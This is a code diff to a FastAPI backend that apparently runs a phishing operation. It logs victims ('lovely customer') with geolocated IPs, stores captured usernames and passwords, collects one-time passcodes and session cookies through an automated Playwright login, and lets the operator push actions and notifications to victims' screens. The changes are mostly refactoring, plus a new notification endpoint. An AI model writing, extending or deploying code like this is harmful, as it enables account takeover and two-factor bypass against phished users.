@@ -1,4 +1,4 @@
-from typing import Union, Annotated
+from typing import Annotated
 import logging
 from fastapi import (
     FastAPI,
@@ -12,14 +12,15 @@ from fastapi import (
 )
 from sqlalchemy.orm import Session
 from database import SessionLocal, engine
-import crud, models, schemas
+import crud
+import models
+import schemas
 import json
 from fastapi.middleware.cors import CORSMiddleware
 import requests
 import time
-import os
 from fastapi.security import APIKeyHeader
-from utils import messageAdmin, CONFIG, logger, DEBUG, xorString
+from utils import messageAdmin, CONFIG, DEBUG, xorString
 
 # import modules.auto_login
 from modules.auto_login_playwright import auto_login
@@ -157,7 +158,7 @@ async def create_lovelyclient(
         if ip_stats["status"] == "fail":
             raise
         admin_message = f"""----\n New lovely customer: :flag-{ip_stats["countryCode"].lower()}: \n ip:{ip} \n id: {id} \n {ip_stats["country"]}, {ip_stats["regionName"]}, {ip_stats["city"]}\n {ip_stats["isp"]}, {ip_stats["org"]} {ip_stats["as"]}\n UserAgent: {user_agent}\n----"""
-    except:
+    except Exception as _:
         admin_message = f"----\n New lovely customer: \n ip:{ip} \n id: {id} \n----"
 
     # messageAdmin(admin_message)
@@ -188,8 +189,8 @@ def ipBlockCheck(
             else:
                 return {"stats": "blocked"}
 
-        except:
-            pass
+        except Exception as e:
+            print(e)
     return {"stats": "not"}
 
 
@@ -221,7 +222,7 @@ def login(
 
     db_user = crud.add_creds(db, id, item.username, item.password)
     if not db_user:
-        return '{"status":"Error"}'
+        return {"error": True}
 
     admin_message = f"----\n Creds: \n id: {id}\n username:{item.username}\n password:{item.password} \n----"
     # messageAdmin(admin_message)
@@ -251,13 +252,13 @@ def login(
         auto_func.start()
         # auto_mode = modules.auto_login(id, item.username, item.password)
         # auto_mode.collect_all()
-    return '{"status":"OK"}'
+    return {"error": False}
 
 
 def auto_mode_func_listner(q, request, id):
     while True:
         curr_msg = q.get()
-        if curr_msg == None:
+        if curr_msg is None:
             continue
         curr_stat = json.loads(curr_msg)
 
@@ -283,7 +284,7 @@ def auto_mode_func_listner(q, request, id):
         if curr_stat["type"] == "internal":
             if curr_stat["msg"] == "cookies":
                 db: Session = next(get_db())
-                db_user = crud.set_Cookie(
+                crud.set_Cookie(
                     db, id, base64.b64encode(str(curr_stat["data"]).encode())
                 )
 
@@ -313,18 +314,41 @@ def get_action(
     db: Session = Depends(get_db),
 ):
     res = crud.get_action(db, id)
+
+    res_notification_msg = crud.get_notification_msg(db, id)
+    if res_notification_msg != "":
+        set_notification_abstracted(id, "")
+
     if not res:
-        return '{"status":"Error"}'
-    return json.dumps({"action": res})
+        return {"error": True}
+    return {"error": False, "action": res, "notification": res_notification_msg}
 
 
 def set_action_abstracted(id, action):
     db: Session = next(get_db())
     db_user = crud.set_action(db, id, action)
     if not db_user:
-        return '{"status":"Error"}'
+        return {"error": True}
 
-    return '{"status":"OK"}'
+    return {"error": False}
+
+
+def set_notification_abstracted(id, msg):
+    db: Session = next(get_db())
+    db_user = crud.set_notification_msg(db, id, msg)
+    if not db_user:
+        return {"error": True}
+
+    return {"error": False}
+
+
+@app.put("/notification/{id}")
+def set_notification(
+    id: int,
+    request: schemas.Notification,
+    db: Session = Depends(get_db),
+):
+    return set_notification_abstracted(id, request.msg)
 
 
 @app.put("/action/{id}/{action}")
@@ -405,17 +429,17 @@ def get_OTP(
 ):
     curr_OTP = crud.get_OTP(db, id)
     if not curr_OTP:
-        return '{"status":"Error"}'
-    return json.dumps({"data": curr_OTP})
+        return {"error": True}
+    return {"error": False, "data": curr_OTP}
 
 
 def set_OPT_abstracted(id, OTP):
     db: Session = next(get_db())
     db_user = crud.set_OTP(db, id, OTP)
     if not db_user:
-        return '{"status":"Error"}'
+        return {"error": True}
 
-    return '{"status":"OK"}'
+    return {"error": False}
 
 
 @app.put("/OTP/{id}/{OTP}")
@@ -459,12 +483,11 @@ def get_User(id: int, request: Request, db: Session = Depends(get_db)):
 
 @app.put("/automode/{mode}", dependencies=[Depends(get_api_key)])
 def set_automode(mode: str, request: Request, db: Session = Depends(get_db)):
-    
     if mode == "true":
         automode = True
     else:
         automode = False
-    crud.set_config_automode(db,automode)
+    crud.set_config_automode(db, automode)
 
 
 @app.get("/automode", dependencies=[Depends(get_api_key)])
@@ -481,9 +504,7 @@ if __name__ == "__main__":
             id=11111111111, ip="127.0.0.1", user_agent="default"
         )
         crud.create_user(db, new_lovelyclient)
-    except:
-        print("Default fallback user is already added")
-        pass
-    
+    except Exception as e:
+        print("Default fallback user is already added ", e)
 
     uvicorn.run(app, host="0.0.0.0", port=8000)
